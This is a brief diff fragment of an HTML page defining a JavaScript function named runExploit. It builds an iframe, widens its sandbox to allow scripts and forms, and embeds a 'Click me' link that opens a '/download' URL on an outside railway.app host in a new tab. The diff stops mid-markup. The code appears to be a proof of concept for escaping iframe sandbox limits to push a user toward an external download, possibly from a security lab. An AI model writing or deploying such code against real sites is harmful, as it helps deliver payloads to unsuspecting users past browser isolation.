@@ -15,7 +15,7 @@
 <script>
     function runExploit() {
         let f = document.createElement('iframe');
-        f.sandbox = 'allow-popups';
+        f.sandbox = 'allow-popups allow-scripts allow-forms';
         f.srcdoc = `
             <a href="https://uta-form349-production-18a0.up.railway.app/download" target="_blank">
                 Click me
